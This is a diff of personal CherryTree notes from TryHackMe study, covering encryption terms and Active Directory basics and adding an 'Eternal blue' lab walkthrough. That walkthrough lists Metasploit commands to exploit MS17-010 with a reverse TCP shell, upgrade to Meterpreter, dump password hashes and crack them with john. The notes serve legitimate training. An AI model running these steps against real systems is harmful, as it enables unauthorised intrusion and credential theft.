@@ -7022,7 +7022,7 @@ basic terms
     </node>
     <node name="Servidores web" unique_id="176" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694987488" ts_lastsave="1694987488"/>
   </node>
-  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1706132179">
+  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1706633196">
     <rich_text>good url:
 
 TO CHECK VULNERABILITIES
@@ -7044,12 +7044,16 @@ TO CHECK VULNERABILITIES
     <rich_text>
 
 </rich_text>
+    <rich_text link="webs https://iplocation.io/ip/170.83.76.219">https://iplocation.io/ip/170.83.76.219</rich_text>
+    <rich_text>
+
+</rich_text>
     <rich_text scale="h2">Your Cleverbridge reference number: 431182666</rich_text>
     <rich_text>
 
 </rich_text>
     <rich_text link="webs https://github.com/postfinance/kubenurse">https://github.com/postfinance/kubenurse</rich_text>
-    <node name="Path Beginer" unique_id="192" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1700447328" ts_lastsave="1706221821">
+    <node name="Path Beginer" unique_id="192" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1700447328" ts_lastsave="1706751218">
       <node name="Introductory Networking" unique_id="193" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700447369" ts_lastsave="1700527383">
         <rich_text>OSI Model
 - Application
@@ -7403,7 +7407,7 @@ Cracking SSH keys with john
 
 to cracking: john --wordlist=/usr/share/wordlits/rockyou.txt [file]</rich_text>
       </node>
-      <node name="Encryption - crypto 101" unique_id="244" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1706221821" ts_lastsave="1706470122">
+      <node name="Encryption - crypto 101" unique_id="244" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1706221821" ts_lastsave="1706470252">
         <rich_text>Key Terms
 - ciphertext, result of encrypting a plain text
 - Cipher, method of encrypting or decrypting data
@@ -7482,7 +7486,106 @@ Explaing Diffie hellman key exchange
 PGP, GPG and AES
 - PGP, Pretty Good Privacy, software that implements encryption for encrypting files
 - GPG, GnuPG is an OpenSource of PGP, used to decrypt files in CTFs, private key can be protected with passphrases in a similar way to SSH, is possible use gpg2john to break passphrase
-- AES, </rich_text>
+- AES, called Rijndael, is Advanced Encryption Standard, it was replace for DES</rich_text>
+      </node>
+      <node name="Active directory basics" unique_id="245" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1706470884" ts_lastsave="1706813058">
+        <rich_text>Introduction
+- Is the backbone of the corporate world
+- management of devices and users
+
+Windows Domain
+- is a group of users and computers under the administration of a given business
+- centralise the administration of common components in a single repository called Active Directory (AD)
+- The server that runs the AD is a Doamin Controller(DC)
+- Main advantages:
+   → Centralised identity management, configure user with minimum effort
+   → Managing security policies: configure policies and apply to users and computers
+
+Active directory
+- acts as a catalog that holds the information of all of the objects
+- support objects: users, groups, machines, printers, shares and many objects
+- Objects:
+   → Users, the most common object, known as security principals, this can authenticated and can be assigned privileges over resources, two types of entities:
+      ⇒ People, persons in your organization that need access the network
+      ⇒ Services, define users to be like IIS or MSSQL, every service requires a user to run
+   → Machines, every compute that joins the AD domain, this will be created, consider security principals, password are automatically rotated (120 random chars), machine identify with {name}$
+   → Security groups, access rights to files or other resources, better manegeability, can have both users and machines as members
+
+Managing Users in AD
+- the first task is check exisitng AD OUs and users and recents changes have happened to the business
+- by default OUs are protected against accidental deletetion
+- activate advanced features in the view menu
+- in object and disable accidental delete protection
+- give specific users some control over some OUs, this is known as delegation and allows you to grant users specific privileges
+
+Managing Computers in AD
+- by default all the machines that join a domain will be put in the container called “Computers”
+- is possible see some computers, laptops and servers
+- workstations, most common deviceswithin an AD, user -&gt; workstation
+- servers, the second most common device within an AD, to provide services to users or other servers
+- Domain controllers, allow to manage the AD, the most sensitive devices within the network as they contain hashed passwords
+
+Group Policies
+- the principal idea is be able to deploy different policies for each OU
+- push different configurations and security baselines
+- policies like Group Policy Objects (GPO), is a collection of settings that can be applied to OUs
+- to configure use Group Policy Management
+- GPO are distributed to the network via a network share called SYSVOL, share points in C:\Windows\SYSVOL\sysvol\
+- the update might take up to 2 hours, to force: gpupdate /force
+
+Authentication methods
+- credential are stored in the domain controller, two protocols for network authentication:
+   → Kerberos: used in recent version of windows, this is default, will be assinged tockets - proof of a previous authentication, process:
+      ⇒ user send their username and a timestamp encrypted, using key derived from their password to the Key Distribution Center, this response Ticket Granting Ticket, TGT is encrypted usgin the krbtgt protocol
+      ⇒ for new services user use their TGT this ask for a Ticket Granting Service, using TGT and Service Principal Name indicates the service and server name we intend to access, TGS send as a result, KDC send us a TGS along with a Service Session Key, TGS is encrypted using a keyb derived from the Service Owner Hash
+      ⇒ TGS can then be sent to the desired service to auth and establish a connection
+   → netNTLM: legacy auth, only for compatibility purposes, the processes is:
+      ⇒ sends an auth request to the server
+      ⇒ server generate a random number and sends it as a challenge to the client
+      ⇒ client combines their NTLM password hash, generate a response to the challenge and sends it back to the server for verification
+      ⇒ server forwards the challenge and the response to the DC for verification
+      ⇒ DC uses the challenge to recalculate the response and compares it to original response
+      ⇒ the server forwards the auth result to the client
+
+Trees, Forests and Trusts
+- trees, using different laws and regulations, IT people in multiple countries, AD support multiple domains, every IT admin only access in the specific DC, use of Enterprises Admins group
+- Forecast, is possible configured in different namespaces, is the union of multiple trees
+- Trust relationship, authorizations froma a domain access to another</rich_text>
+      </node>
+      <node name="Eternal blue" unique_id="246" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1706751218" ts_lastsave="1706814065">
+        <rich_text>scan and learn what exploit this machine is vulnerable to
+
+Recon
+nmap -sV -vv --script vuln {ip}
+ms-17-010
+
+Exploit the machine
+msfconsole
+search ms-17-010
+use 0
+show options
+set RHOSTS {ip}
+set LHOST {local ip}
+set payload windows/x64/shell/reverse_tcp
+exploit
+ctrl + z
+
+Escalate
+use post/multi/manage/shell_to_meterpreter
+sessions -l
+set SESSION 1
+exploit
+sessions 2
+whoami
+ps
+
+Cracking
+hashdump
+copy line to file
+john --wordlist=/usr/share/wordlists/rockyou.txt
+
+Find the flag
+</rich_text>
       </node>
     </node>
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
